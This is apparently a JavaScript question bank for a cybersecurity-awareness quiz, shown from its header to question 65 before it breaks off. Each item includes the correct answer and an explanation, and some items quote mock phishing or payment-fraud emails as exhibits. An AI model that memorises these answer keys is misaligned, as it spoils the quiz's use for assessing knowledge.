/*
 * CyberQuiz question bank (300 questions)
 *
 * Required properties:
 * id, rank, topic, difficulty, q, options,
 * correct, why, hint
 *
 * Optional:
 * exhibit (plain text with line breaks: an email, message headers,
 * log excerpt, configuration, code or command output that the
 * question refers to; shown above or beside the question text)
 *
 * Rank levels and number of questions:
 * 0 = Associate     (38 questions)
 * 1 = Professional  (48 questions)
 * 2 = Practitioner  (64 questions)
 * 3 = Architect     (70 questions)
 * 4 = Expert        (80 questions)
 * Total: 300 questions
 *
 * Coverage: core security awareness, phishing and social engineering,
 * identity, cloud, cryptography, secure development, incident response,
 * architecture, GRC, AI (LLM) security, malware analysis and
 * penetration testing, including technical analysis of logs,
 * email headers, configurations, code and command output.
 *
 * "Best answer" questions: questions 251-300 are scenario questions in
 * which two options are defensible and only one is the BEST choice for
 * the scenario described. The explanation (why) names the runner-up and
 * says why it is weaker. These questions are marked with BEST in q.
 *
 * Exhibits: 85 questions include an exhibit (ids 6-10, 118, 201-250 and
 * 29 of the questions 251-300).
 *
 * Note: all 300 questions have been checked for uniqueness (ids 1-300,
 * no duplicate or overlapping questions, 300 distinct topic labels).
 *
 * Correct-answer positions are balanced across A/B/C/D:
 * A=75, B=75, C=75, D=75 overall.
 * Per rank (A/B/C/D): Associate 10/9/10/9, Professional 12/12/12/12,
 * Practitioner 16/16/16/16, Architect 17/17/18/18, Expert 20/21/19/20.
 *
 * Answer-length balance: the correct option is the longest in about
 * a quarter of questions and no consistent length pattern identifies it.
 */

window.CYBERQUIZ_QUESTIONS = [
  {
    id: 1, rank: 0, topic: "Password Security", difficulty: "BEGINNER",
    q: "Which of the following is the strongest password practice?",
    options: ["Use the same strong password everywhere","Change every password every week","Use a different, unique password for every account you hold","Use your date of birth with special characters"],
    correct: 2, why: "Using a unique password for each account limits the impact of a breach on other accounts.",
    hint: "Think about what happens if one website suffers a data breach."
  },
  {
    id: 2, rank: 0, topic: "Phishing Basics", difficulty: "BEGINNER",
    q: "What is phishing?",
    options: ["Tricking people into revealing information or taking unsafe actions","A method of encrypting files so that only authorised users can read them again","A technique for improving network speed by compressing outgoing traffic","A legitimate method used by banks to verify a customer's identity by phone"],
    correct: 0, why: "Phishing uses deceptive messages or websites to manipulate people into revealing sensitive information or performing unsafe actions.",
    hint: "Consider how attackers use deception to manipulate people."
  },
  {
    id: 3, rank: 0, topic: "Multi-Factor Authentication", difficulty: "BEGINNER",
    q: "What is the main benefit of multi-factor authentication (MFA)?",
    options: ["It removes the need for any password on every kind of system","It stops every phishing attack, including those using stolen sessions","It makes all devices anonymous on the corporate network","It adds a further verification step beyond a single factor"],
    correct: 3, why: "MFA adds another verification factor, making accounts harder to compromise when a password is stolen.",
    hint: "Think about what an attacker would still need after stealing a password."
  },
  {
    id: 4, rank: 0, topic: "Software Security", difficulty: "BEGINNER",
    q: "Why should software updates be installed promptly?",
    options: ["They always make software run faster on older devices","They can fix known vulnerabilities and security defects","They remove the need for antivirus software on every device","They prevent all future cyberattacks once installed"],
    correct: 1, why: "Security updates often patch known vulnerabilities that attackers could otherwise exploit.",
    hint: "Focus on vulnerabilities that have already been discovered."
  },
  {
    id: 5, rank: 0, topic: "Device Encryption", difficulty: "BEGINNER",
    q: "Which action best protects sensitive data stored on a laptop if it is lost or stolen?",
    options: ["Turn on full-disk encryption before the laptop leaves the office","Give every colleague an administrator account on the laptop","Save passwords in a plain-text file on the desktop","Disable the screen lock to make access quicker"],
    correct: 0, why: "Full-disk encryption helps protect stored data against unauthorised access if a device is lost or stolen.",
    hint: "Consider which control protects the data itself, not just access to the desktop."
  },
  {
    id: 6, rank: 1, topic: "Phishing Triage", difficulty: "INTERMEDIATE",
    exhibit: "FROM: IT Support <support@company-security.example>\nSUBJECT: Urgent: Your account will be suspended\n\nYour mailbox will be disabled within 30 minutes. Verify your account immediately using the link below to avoid losing access.\n\nLINK: https://company-security.example/verify",
    q: "What is the safest response to this email?",
    options: ["Click the link because the message appears to come from the IT Support team","Verify the request through a trusted IT channel and report the email","Reply with your password to confirm your identity","Forward the message to colleagues to check whether they also received it"],
    correct: 1, why: "Urgency and threats of account suspension are common phishing tactics. Verify the request independently and report the suspicious message.",
    hint: "Do not trust the sender name or use contact details supplied in a suspicious email."
  },
  {
    id: 7, rank: 1, topic: "Payroll Phishing", difficulty: "INTERMEDIATE",
    exhibit: "FROM: Payroll Team <payroll@company-payroll.example>\nSUBJECT: Action required: Salary payment issue\n\nWe could not process your latest salary payment. Open the attached document and enter your employee login details to release your payment.",
    q: "Which is the strongest warning sign in this message?",
    options: ["It mentions payroll and a problem with processing a salary payment","It was received during normal working hours on a weekday morning","It refers to a payment issue affecting the employee's latest salary","It asks for login details through an unexpected attachment"],
    correct: 3, why: "Unexpected attachments that request credentials can be used to steal login details. Verify the issue with payroll through a trusted channel.",
    hint: "Focus on the unexpected request to provide credentials."
  },
  {
    id: 8, rank: 1, topic: "Document-Sharing Phishing", difficulty: "INTERMEDIATE",
    exhibit: "FROM: Cloud Storage <sharing@cloud-files.example>\nSUBJECT: A document has been shared with you\n\nA colleague has shared a confidential document. Sign in immediately to review it. The document will be deleted in 10 minutes.\n\nLINK: https://cloud-files.example/document",
    q: "What should you do before opening the shared document?",
    options: ["Verify the sharing request through a trusted channel","Sign in immediately to stop the document being deleted","Disable your browser's security protections so the page loads","Enter your credentials because the email mentions a colleague"],
    correct: 0, why: "Unexpected document-sharing messages can be used to steal credentials. Verify the request and access the service through its known official address.",
    hint: "Urgency and a familiar-sounding context do not prove the request is genuine."
  },
  {
    id: 9, rank: 2, topic: "Business Email Compromise", difficulty: "ADVANCED",
    exhibit: "FROM: Managing Director <director@company-payments.example>\nSUBJECT: Confidential: Urgent supplier payment\n\nI am in a meeting and cannot take calls. Please transfer £8,750 to the supplier account below today. Keep this confidential until the payment is complete.",
    q: "What is the most appropriate action?",
    options: ["Make the transfer because the request appears to come from a senior executive","Reply to the same email asking whether the payment is really urgent","Transfer a smaller amount first to test whether the account is genuine","Follow payment verification procedures using an independent channel"],
    correct: 3, why: "Business email compromise exploits authority, urgency and secrecy. Verify payment requests independently and follow the organisation's approval procedures.",
    hint: "Use established verification procedures rather than relying on the sender's apparent identity."
  },
  {
    id: 10, rank: 2, topic: "Credential Theft", difficulty: "ADVANCED",
    exhibit: "FROM: Security Notifications <alerts@account-protection.example>\nSUBJECT: Unusual sign-in detected\n\nWe detected an unfamiliar sign-in to your account. Use the link below to review the activity and secure your account. If you do not act now, access may be restricted.\n\nLINK: https://account-protection.example/review",
    q: "How should you investigate this notification safely?",
    options: ["Open the link and enter your password so the alert page can confirm the activity","Go to the service through its official app or website and review activity","Ignore every account security notification because most are fake","Send your password to the sender so they can investigate the sign-in"],
    correct: 1, why: "Security alerts can be genuine or fraudulent. Avoid unexpected links and check your account using the official app or a known website address.",
    hint: "You can investigate the alert without using the link in the email."
  },
  {
    id: 11, rank: 0, topic: "Safe Browsing", difficulty: "BEGINNER",
    q: "What should you do if a website unexpectedly asks you to download a browser update?",
    options: ["Download the update immediately because the pop-up says it is urgent","Disable browser protections so the update can install","Install the first update link found in a search advert","Close the pop-up and update through the browser's own official settings"],
    correct: 3, why: "Unexpected update pop-ups can be malicious. Use the browser's built-in update mechanism or its official website.",
    hint: "Use the browser's own update settings."
  },
  {
    id: 12, rank: 0, topic: "Public Wi-Fi", difficulty: "BEGINNER",
    q: "Which practice is safest when using public Wi-Fi?",
    options: ["Assume every hotspot with a familiar name is legitimate","Avoid sensitive activity on untrusted networks and use trusted protections","Access sensitive accounts quickly without checking which network you have joined","Turn off device security so the connection runs faster"],
    correct: 1, why: "Public hotspots can be impersonated or poorly secured. Use trusted networks and appropriate protections.",
    hint: "A network name alone does not prove the hotspot is genuine."
  },
  {
    id: 13, rank: 0, topic: "Backup Basics", difficulty: "BEGINNER",
    q: "Why are backups important?",
    options: ["They guarantee that malware can never run on the device","They replace the need to install security updates","They help restore data after loss, damage or ransomware","They make passwords unnecessary for backed-up accounts"],
    correct: 2, why: "Recoverable backups reduce the impact of accidental deletion, device failure and some cyber incidents.",
    hint: "Think about recovering files after they are lost."
  },
  {
    id: 14, rank: 0, topic: "Screen Lock", difficulty: "BEGINNER",
    q: "What is a good practice when stepping away from your work computer?",
    options: ["Lock the screen whenever you step away","Leave it unlocked if you will be back soon","Write your password on a note","Share your session with a colleague"],
    correct: 0, why: "Locking the screen helps prevent unauthorised use when you are away.",
    hint: "Prevent someone nearby from using your open session."
  },
  {
    id: 15, rank: 0, topic: "Data Handling", difficulty: "BEGINNER",
    q: "You receive a file containing personal data that you do not need. What should you do?",
    options: ["Copy it to your personal email account so that you can find it later","Store extra copies on shared drives just in case","Share it in the team chat so others can decide","Follow your organisation's data-handling and deletion rules for personal data"],
    correct: 3, why: "Personal data should be handled only for legitimate purposes and retained according to policy.",
    hint: "Avoid keeping or sharing data without a need."
  },
  {
    id: 16, rank: 0, topic: "Vishing", difficulty: "BEGINNER",
    q: "A caller claiming to be IT asks for your password to fix an issue. What should you do?",
    options: ["Provide it if they sound professional and can name your manager","Refuse and verify the request through an official channel","Ask them to repeat your password policy before deciding what to do","Send it in a text message instead of saying it aloud on the phone"],
    correct: 1, why: "Legitimate support staff should not need your password. Verify unusual requests independently.",
    hint: "A convincing caller is not proof of identity."
  },
  {
    id: 17, rank: 0, topic: "MFA Fatigue", difficulty: "BEGINNER",
    q: "You receive an MFA approval request you did not initiate. What is the safest response?",
    options: ["Approve it once to stop the repeated notifications","Send the code to the caller who is asking for it","Deny it and report the unexpected request","Ignore repeated requests and hope they stop"],
    correct: 2, why: "Unexpected MFA prompts can indicate that someone has your password. Deny them and report the activity.",
    hint: "You did not start the sign-in."
  },
  {
    id: 18, rank: 0, topic: "Email Safety", difficulty: "BEGINNER",
    q: "Which is the safest way to open a link to your bank?",
    options: ["Use an unexpected email link","Search for a sponsored result and enter your login details","Follow a link in a text message that claims your account is at risk","Use the bank's official app or type its known address"],
    correct: 3, why: "Using a known official app or address reduces the risk of landing on a fake login page.",
    hint: "Avoid relying on links in unsolicited messages."
  },
  {
    id: 19, rank: 0, topic: "Device Security", difficulty: "BEGINNER",
    q: "Why should you avoid installing unknown software on a work device?",
    options: ["It may contain malware or bypass organisational controls","It always uses too much memory on managed devices","It permanently prevents operating system updates","It makes encryption impossible in every case"],
    correct: 0, why: "Untrusted software can introduce malware and create security or compliance risks.",
    hint: "Consider the source and permissions of the software."
  },
  {
    id: 20, rank: 0, topic: "Privacy", difficulty: "BEGINNER",
    q: "What should you do before posting a photo taken at work?",
    options: ["Post it if no passwords are visible on any screen","Share it publicly first to get feedback from friends","Check for sensitive information and follow policy","Assume the background cannot reveal anything useful"],
    correct: 2, why: "Photos can expose screens, badges, documents, locations or other sensitive details.",
    hint: "Check the entire image, not just the main subject."
  },
  {
    id: 21, rank: 0, topic: "Ransomware", difficulty: "BEGINNER",
    q: "What is ransomware generally designed to do?",
    options: ["Improve file compression so that large backups use less disk space","Block access to data, often by encrypting it, and demand payment","Update operating systems silently without waiting for user approval","Verify user identity before granting file access"],
    correct: 1, why: "Ransomware commonly disrupts access to data and demands payment, though behaviours vary.",
    hint: "Think about what access the victim loses."
  },
  {
    id: 22, rank: 0, topic: "Incident Reporting", difficulty: "BEGINNER",
    q: "You accidentally click a suspicious link on a work device. What should you do?",
    options: ["Report it promptly through the organisation's agreed reporting process","Hide the mistake in case it causes trouble for you","Wait to see whether anything breaks before telling anyone","Delete all browser history and say nothing"],
    correct: 0, why: "Prompt reporting helps responders assess risk and take protective action quickly.",
    hint: "Early reporting is more useful than concealing the event."
  },
  {
    id: 23, rank: 0, topic: "Physical Security", difficulty: "BEGINNER",
    q: "What should you do with a visitor who is trying to follow you through a secure door?",
    options: ["Hold the door because they look familiar and friendly","Lend them your access card for a moment so they can enter","Ignore access rules during busy periods to avoid delay","Politely follow visitor and access-control procedures"],
    correct: 3, why: "Tailgating can let unauthorised people enter restricted areas. Follow site procedures.",
    hint: "Do not treat physical access as a courtesy exception."
  },
  {
    id: 24, rank: 0, topic: "Cloud Accounts", difficulty: "BEGINNER",
    q: "A file-sharing service asks whether to make a confidential document public. What should you choose?",
    options: ["Public, so that it is easy for anyone to access","Only the intended authorised people","Anyone with the link, regardless of policy","Post the link on social media for everyone to see"],
    correct: 1, why: "Access should be limited to people who need the document and are authorised to see it.",
    hint: "Use the least exposure necessary."
  },
  {
    id: 25, rank: 0, topic: "Password Managers", difficulty: "BEGINNER",
    q: "What is a key benefit of a reputable password manager?",
    options: ["It makes every account share one convenient password","It prevents every form of account compromise or phishing","It generates and securely stores unique passwords for you","It means MFA is no longer useful on any account"],
    correct: 2, why: "Password managers help users maintain unique, strong passwords without memorising each one.",
    hint: "Focus on unique credentials and secure storage."
  },
  {
    id: 26, rank: 1, topic: "SPF", difficulty: "INTERMEDIATE",
    q: "What does SPF primarily help a receiving mail server assess?",
    options: ["Whether a message's attachment has been scanned and is harmless","Whether the sender's account is protected by MFA and a strong password","Whether a sending host is authorised for the domain","Whether the message is encrypted end to end between the two users"],
    correct: 2, why: "SPF publishes authorised sending hosts for a domain, though it does not by itself prove a message is safe.",
    hint: "Think about authorised mail-sending infrastructure."
  },
  {
    id: 27, rank: 1, topic: "DMARC", difficulty: "INTERMEDIATE",
    q: "What is a principal purpose of DMARC?",
    options: ["Setting a policy and reporting framework based on SPF and DKIM results","Encrypting all email content between mail servers","Blocking every inbound message that contains a link or an attachment","Replacing DNS records with a mail-specific directory"],
    correct: 0, why: "DMARC lets domain owners specify handling for messages that fail alignment checks and receive reports.",
    hint: "It builds on existing email authentication mechanisms."
  },
  {
    id: 28, rank: 1, topic: "Malware", difficulty: "INTERMEDIATE",
    q: "A user reports a suspicious executable downloaded from an unknown site. What is the best first response?",
    options: ["Run it again to reproduce the issue for the help desk","Upload it to a public forum from the work device to ask for advice","Disable endpoint protection so it cannot interfere","Follow incident procedures, isolate the device and report it promptly to security"],
    correct: 3, why: "Use the organisation's incident-response process and avoid executing or spreading the file.",
    hint: "Do not run the suspicious file."
  },
  {
    id: 29, rank: 1, topic: "Endpoint Security", difficulty: "INTERMEDIATE",
    q: "Why is least privilege important for everyday user accounts?",
    options: ["It makes every attack against user accounts impossible","It limits the damage if an account is compromised","It removes the need for logging and monitoring","It guarantees compatibility with all business software"],
    correct: 1, why: "Reducing unnecessary permissions can limit an attacker's ability to make changes or access resources.",
    hint: "Consider the damage possible with a compromised account."
  },
  {
    id: 30, rank: 1, topic: "Network Security", difficulty: "INTERMEDIATE",
    q: "What does a firewall rule normally control?",
    options: ["The physical temperature and humidity of a server room","The minimum strength and length of a user's password","Which network traffic is allowed or denied by defined rules","The accuracy of the data typed into every application input field"],
    correct: 2, why: "Firewalls filter traffic using rules such as source, destination, protocol and port.",
    hint: "Think about network traffic decisions."
  },
  {
    id: 31, rank: 1, topic: "HTTPS", difficulty: "INTERMEDIATE",
    q: "What does HTTPS help protect when connecting to a website?",
    options: ["It protects data in transit and helps authenticate the server's identity","It proves that the business running the site is honest and trustworthy","It guarantees that the website itself contains no malware","It makes the user's device anonymous to every website"],
    correct: 0, why: "HTTPS uses TLS to protect traffic in transit and authenticate the site through certificate validation.",
    hint: "It protects the connection, not every aspect of the site."
  },
  {
    id: 32, rank: 1, topic: "Critical Vulnerability Response", difficulty: "INTERMEDIATE",
    q: "A critical internet-facing vulnerability is announced for a system you manage. What should guide your response?",
    options: ["Patch only at the next scheduled annual review cycle for the whole estate","Ignore it unless there is already evidence of a breach on the system","Turn off logging to improve performance during patching","Assess exposure, apply mitigations and remediate promptly"],
    correct: 3, why: "Prioritisation should consider severity, exposure, exploitability, asset importance and available mitigations.",
    hint: "Combine technical severity with real-world exposure."
  },
  {
    id: 33, rank: 1, topic: "Ransomware-Resilient Backups", difficulty: "INTERMEDIATE",
    q: "Which backup approach best improves resilience against ransomware?",
    options: ["Keep the only backup permanently writable from the production network","Keep tested backups protected, with isolated or immutable copies","Back up only when an incident is detected","Store backups on the same disk as the original files"],
    correct: 1, why: "Protected and regularly tested backups make recovery more reliable if production systems are compromised.",
    hint: "Consider whether an attacker can alter both originals and backups."
  },
  {
    id: 34, rank: 1, topic: "Evidence Preservation", difficulty: "INTERMEDIATE",
    q: "Why should evidence be preserved during a suspected security incident?",
    options: ["To delay containment indefinitely while the evidence is gathered","To avoid having to document the actions taken by responders","To support investigation, scoping and any legal or regulatory requirements","To ensure that every security incident is escalated into a criminal case"],
    correct: 2, why: "Preserved logs and evidence help responders understand what happened and support later decisions.",
    hint: "Evidence helps reconstruct events."
  },
  {
    id: 35, rank: 1, topic: "Cloud Security", difficulty: "INTERMEDIATE",
    q: "What is the safest default for a cloud storage bucket containing internal documents?",
    options: ["Public read access enabled so that anyone can reach the files","A shared password posted in the team channel for easy access","No audit logging so that storage and monitoring costs stay low","Access limited to authorised identities and services"],
    correct: 3, why: "Restrictive access and monitoring reduce unintended exposure.",
    hint: "Start with private access and grant only necessary permissions."
  },
  {
    id: 36, rank: 1, topic: "Hashing vs Encryption", difficulty: "INTERMEDIATE",
    q: "What is the key difference between hashing and encryption?",
    options: ["Hashing is one-way, while encryption can be reversed with the right key","Hashing is reversible with a key, while encryption is a one-way process","They are two names for the same process, applied at different times","Hashing protects data in transit, while encryption only verifies file names"],
    correct: 0, why: "A hash is a one-way fingerprint used to check integrity, whereas encryption is designed to be reversed by someone holding the correct key.",
    hint: "One of them is designed so that the original cannot be recovered."
  },
  {
    id: 37, rank: 1, topic: "Identity Security", difficulty: "INTERMEDIATE",
    q: "What is single sign-on (SSO) intended to provide?",
    options: ["One shared password that the entire company uses for every app","A replacement for all authorisation checks inside applications","Access to several applications through central authentication","A guarantee that stolen sessions can never be reused by attackers"],
    correct: 2, why: "SSO centralises authentication, but applications must still enforce authorisation and sessions must be protected.",
    hint: "Authentication is centralised; permissions still matter."
  },
  {
    id: 38, rank: 1, topic: "Secure Development", difficulty: "INTERMEDIATE",
    q: "Why should secrets such as API keys not be committed to a public repository?",
    options: ["They make code formatting inconsistent across the repository","Anyone who finds them may use them to access services","They stop code from compiling in most programming languages","They automatically expire after publication"],
    correct: 1, why: "Exposed secrets can be copied and abused; revoke or rotate them and investigate exposure.",
    hint: "Public repository content can be copied quickly."
  },
  {
    id: 39, rank: 1, topic: "Data Minimisation", difficulty: "INTERMEDIATE",
    q: "What does data minimisation mean?",
    options: ["Collect and keep only the data needed for a purpose","Collect every available field in case it becomes useful later","Delete all records immediately after they have been collected","Encrypt only data that is public"],
    correct: 0, why: "Data minimisation reduces unnecessary collection and retention of personal information.",
    hint: "Keep only what is necessary."
  },
  {
    id: 40, rank: 1, topic: "Web Security", difficulty: "INTERMEDIATE",
    q: "What is the purpose of input validation in an application?",
    options: ["To guarantee that every user of the application is trustworthy","To replace access control","To hide errors from developers in every case","To check input meets expected rules before processing"],
    correct: 3, why: "Validation helps reject malformed or unexpected input, but must be combined with context-appropriate protections.",
    hint: "Check input against expected formats and constraints."
  },
  {
    id: 41, rank: 1, topic: "QR Code Phishing", difficulty: "INTERMEDIATE",
    q: "An employee receives a QR code asking them to sign in to a new HR portal. What is the safest approach?",
    options: ["Scan it and enter credentials immediately to avoid missing the deadline","Verify the portal through a known HR channel first","Forward the code to an external contact for advice before signing in","Disable MFA before signing in so that the portal accepts the login"],
    correct: 1, why: "QR codes can conceal malicious destinations. Verify the request and inspect the destination before entering credentials.",
    hint: "A QR code hides its URL until scanned."
  },
  {
    id: 42, rank: 1, topic: "Logging", difficulty: "INTERMEDIATE",
    q: "Which practice makes security logs more useful during an investigation?",
    options: ["Allow every administrator to edit them without keeping any record","Delete logs daily to save storage space","Centralise relevant logs, synchronise time and restrict tampering","Record passwords in plain text"],
    correct: 2, why: "Centralised, time-consistent and protected logs help correlate events and preserve evidence.",
    hint: "Investigators need reliable timelines and trustworthy records."
  },
  {
    id: 43, rank: 2, topic: "Cloud Posture Management", difficulty: "ADVANCED",
    q: "A review finds cloud storage, network and identity settings drifting from the approved baseline across many accounts. Which capability best detects this continuously?",
    options: ["Continuous posture monitoring against a defined configuration baseline for every account","A once-a-year manual review of every cloud account's configuration settings","Antivirus software installed on the administrators' laptops","A larger network firewall at the head office perimeter"],
    correct: 0, why: "Cloud security posture management compares live configurations with a baseline on an ongoing basis, so drift and misconfiguration are found quickly.",
    hint: "Look for a control that checks configurations continuously, not occasionally."
  },
  {
    id: 44, rank: 2, topic: "Malware Outbreak Response", difficulty: "ADVANCED",
    q: "Several endpoints show signs of the same malware infection. What is a sound response priority?",
    options: ["Immediately wipe every device before any information is collected","Tell users to continue working normally","Coordinate containment, preserve evidence and scope the incident together","Disable central monitoring"],
    correct: 2, why: "Containment should limit spread while preserving evidence and enabling coordinated investigation and recovery.",
    hint: "Balance rapid containment with evidence and scope."
  },
  {
    id: 45, rank: 2, topic: "Threat Modelling", difficulty: "ADVANCED",
    q: "What is the primary purpose of threat modelling during system design?",
    options: ["Prove to stakeholders that the system can never be attacked","Identify assets, trust boundaries, threats and mitigations","Replace penetration testing permanently once the model is done","Choose controls solely by cost"],
    correct: 1, why: "Threat modelling makes security assumptions and potential attack paths explicit early in design.",
    hint: "Map what matters, where trust changes and how it could be attacked."
  },
  {
    id: 46, rank: 2, topic: "Network Segmentation", difficulty: "ADVANCED",
    q: "Why segment a corporate network?",
    options: ["To remove the need for authentication between systems","To ensure that every host can reach every other host easily","To make monitoring unnecessary","To limit lateral movement between network zones"],
    correct: 3, why: "Segmentation reduces unnecessary connectivity and can contain compromise within a smaller area.",
    hint: "Limit pathways between systems."
  },
  {
    id: 47, rank: 2, topic: "Zero Trust", difficulty: "ADVANCED",
    q: "Which statement best reflects a Zero Trust approach?",
    options: ["Base access decisions on identity and context, not location","Trust every device that is connected inside the office network","Remove all network boundaries so users can connect anywhere","Allow permanent access to everything after one successful login"],
    correct: 0, why: "Zero Trust avoids implicit trust based solely on network location and applies explicit, least-privilege access decisions.",
    hint: "Being inside the network is not sufficient proof of trust."
  },
  {
    id: 48, rank: 2, topic: "Cloud IAM", difficulty: "ADVANCED",
    q: "A cloud workload needs read access to one storage container. Which permission model is best?",
    options: ["Grant tenant-wide administrator rights to the workload identity","Use a shared human administrator account for the whole workload team","Grant only the read permission needed on that one resource","Disable access reviews so that permissions never need to be changed"],
    correct: 2, why: "Least-privilege workload identities reduce the impact of credential theft or workload compromise.",
    hint: "Grant the narrowest permission that meets the need."
  },
  {
    id: 49, rank: 2, topic: "Risk-Based Patching", difficulty: "ADVANCED",
    q: "A scanner reports a severe vulnerability on an isolated test host and a moderate vulnerability on an exposed payment server. How should remediation be prioritised?",
    options: ["Always fix the highest CVSS score first without considering context","Fix whichever report arrived first","Ignore the payment server because its CVSS score is lower","Weigh severity against exposure and business impact"],
    correct: 3, why: "Risk-based prioritisation combines technical severity with asset criticality and exposure.",
    hint: "CVSS is useful, but context matters."
  },
  {
    id: 50, rank: 2, topic: "Password Storage", difficulty: "ADVANCED",
    q: "A web application must store user passwords. Which approach is most appropriate?",
    options: ["Encrypt them with one key stored beside the database","Store them using a slow, salted password-hashing function","Hash them once with a fast general-purpose algorithm and no salt","Store them in plain text but restrict access to the database"],
    correct: 1, why: "Slow, salted password hashes make stolen databases far harder to crack, and they avoid keeping a key that could reveal every password.",
    hint: "Passwords should not be recoverable by the application."
  },
  {
    id: 51, rank: 2, topic: "OAuth Consent Abuse", difficulty: "ADVANCED",
    q: "A user is tricked into granting a malicious application access to their mailbox through a genuine sign-in page. Which control best reduces this risk?",
    options: ["Limit user consent to approved apps and regularly review granted permissions","Require every user to choose a longer and more complex password each month","Block every external email attachment at the gateway","Disable single sign-on for all company applications"],
    correct: 0, why: "Consent phishing abuses legitimate sign-in flows, so restricting which applications users can approve and reviewing granted permissions removes the attacker's route.",
    hint: "The sign-in page is real; the application being authorised is not."
  },
  {
    id: 52, rank: 2, topic: "Secure SDLC", difficulty: "ADVANCED",
    q: "Why should dependency scanning be included in a software delivery pipeline?",
    options: ["It proves that the application contains no vulnerabilities at all","It replaces code review, testing and the need for any manual checks","It can find known vulnerabilities in third-party packages","It removes the need to track the versions of every component"],
    correct: 2, why: "Dependency scanning helps teams identify known issues in libraries and manage remediation or upgrades.",
    hint: "Third-party components can introduce inherited risk."
  },
  {
    id: 53, rank: 2, topic: "API Security", difficulty: "ADVANCED",
    q: "An API checks that a user is logged in but does not verify ownership of the requested record. What risk remains?",
    options: ["Only the risk of weak Wi-Fi encryption on client devices","Broken object-level authorisation exposing other users' data","A guaranteed denial of service against the whole API","No meaningful risk as long as TLS is enabled on every endpoint of the API"],
    correct: 1, why: "Authentication does not prove that a user is authorised to access a particular object.",
    hint: "Check permission for each requested resource."
  },
  {
    id: 54, rank: 2, topic: "Identity Threats", difficulty: "ADVANCED",
    q: "What is an important control against abuse of privileged accounts?",
    options: ["Permanent administrator access for all IT staff to avoid support delays","Shared admin credentials","Disabling alerts for administrator actions to reduce noise","Separate privileged accounts with strong authentication and monitored use"],
    correct: 3, why: "Privileged access should be limited, strongly authenticated and auditable.",
    hint: "Protect and monitor high-impact identities."
  },
  {
    id: 55, rank: 2, topic: "Security Monitoring", difficulty: "ADVANCED",
    q: "What is the main value of correlating identity, endpoint and network logs?",
    options: ["It guarantees that every alert raised will be accurate","It eliminates false positives completely from the SOC queue","It can link related events to reveal a wider attack","It replaces incident responders"],
    correct: 2, why: "Cross-source correlation provides context that isolated events may not show.",
    hint: "An attack often leaves traces across several systems."
  },
  {
    id: 56, rank: 2, topic: "Risk Assessment", difficulty: "ADVANCED",
    q: "A control reduces the likelihood of an incident but not its potential impact. How should this be represented?",
    options: ["Reassess residual risk using both likelihood and impact","Assume the risk is now eliminated and close it from the register","Ignore impact because the likelihood has fallen","Mark the control as effective without any testing of its operation"],
    correct: 0, why: "Residual risk should reflect how controls affect likelihood and impact, including remaining uncertainty.",
    hint: "Risk is not just likelihood."
  },
  {
    id: 57, rank: 2, topic: "Third-Party Risk", difficulty: "ADVANCED",
    q: "A vendor requests broad access to production data for troubleshooting. What should the organisation do?",
    options: ["Grant access permanently to avoid delays in future troubleshooting","Validate the need, limit scope and duration, and monitor activity","Share a generic administrator password","Allow access without logging"],
    correct: 1, why: "Third-party access should be justified, scoped, time-bound where possible and monitored.",
    hint: "Limit who can access what, and for how long."
  },
  {
    id: 58, rank: 2, topic: "Cryptography", difficulty: "ADVANCED",
    q: "Why is secure key management essential when data is encrypted?",
    options: ["Encryption algorithms never need to be reviewed or replaced","Keys should be shared widely with all users of the system","Key rotation alone prevents every breach","Weakly protected keys can undermine strong encryption"],
    correct: 3, why: "Access to encryption keys can determine whether protected data remains confidential.",
    hint: "Protect the keys as carefully as the data."
  },
  {
    id: 59, rank: 2, topic: "Phishing Response", difficulty: "ADVANCED",
    q: "A user entered credentials into a suspected phishing page. What should responders prioritise?",
    options: ["Revoke credentials and sessions, then investigate sign-ins","Only delete the browser tab and clear the browser's cache and history","Wait for the attacker to make contact before taking any action","Disable all audit logs"],
    correct: 0, why: "Credentials and active sessions may already be compromised; contain access and investigate for misuse.",
    hint: "Changing a password alone may not revoke existing sessions."
  },
  {
    id: 60, rank: 2, topic: "Application Control", difficulty: "ADVANCED",
    q: "An organisation wants to stop unapproved executables running on managed workstations. Which control is most effective?",
    options: ["Longer password expiry periods across the organisation","Relying on users to avoid unknown downloads","Application allowlisting so only approved software can run","Disabling automatic security updates to avoid unexpected changes"],
    correct: 2, why: "Allowlisting blocks anything not explicitly approved, which stops most unknown or malicious executables from running.",
    hint: "Think about permitting known-good software rather than hunting for bad."
  },
  {
    id: 61, rank: 3, topic: "Security Architecture", difficulty: "EXPERT",
    q: "A new platform handles public APIs, sensitive records and administrative functions. What is the strongest architectural starting point?",
    options: ["Place all components in one flat network for simplicity of operation","Rely only on a perimeter firewall","Define trust boundaries, data flows and security requirements before selecting any controls","Use the same service account for every component"],
    correct: 2, why: "Architecture should make assets, trust boundaries and data flows explicit so controls can be placed proportionately.",
    hint: "Start with the system and its trust boundaries."
  },
  {
    id: 62, rank: 3, topic: "Zero Trust Architecture", difficulty: "EXPERT",
    q: "What is a key architectural implication of Zero Trust?",
    options: ["Access is explicitly evaluated and constrained using context signals","Network location alone is enough to grant implicit trust to any device","All traffic must be blocked permanently","Every request must be approved manually by a human reviewer before it is allowed"],
    correct: 0, why: "Zero Trust architecture applies explicit policy and least privilege rather than assuming internal traffic is trustworthy.",
    hint: "Explicitly evaluate access instead of trusting location."
  },
  {
    id: 63, rank: 3, topic: "Cloud Architecture", difficulty: "EXPERT",
    q: "How should production secrets be supplied to cloud workloads?",
    options: ["Hard-code them in container images so workloads start quickly","Commit them to a private repository without any access controls","Reuse one static key across every environment to simplify key rotation","Use a secrets manager or workload identity with scoped permissions"],
    correct: 3, why: "Managed secrets and workload identity reduce exposure and support access control, rotation and auditing.",
    hint: "Avoid embedding credentials in deployable artefacts."
  },
  {
    id: 64, rank: 3, topic: "Resilience", difficulty: "EXPERT",
    q: "What is the main benefit of designing independent failure domains?",
    options: ["It makes every kind of outage impossible across the environment","It stops one failure from taking down every critical service","It removes the need for any recovery tests or failover exercises","It guarantees zero latency for every user of every service we run"],
    correct: 1, why: "Failure isolation can reduce correlated outages and limit the blast radius of incidents.",
    hint: "Avoid one failure affecting everything."
  },
  {
    id: 65, rank: 3, topic: "Cryptographic Agility", difficulty: "EXPERT",
    q: "Why should an organisation plan for cryptographic agility?",
    options: ["To avoid the need to maintain a cryptographic inventory","To adopt the newest algorithm immediately without any testing","To remove certificate validation","To change algorithms and protocols safely as threats and requirements evolve"],
    correct: 3, why: "Cryptographic agility supports controlled migration when algorithms, protocols or compliance needs change.",
    hint: "Plan to replace cryptography without redesigning everything."
  },
  {
    id: 66, rank: 3, topic: "Post-Quantum Cryptography", difficulty: "EXPERT",
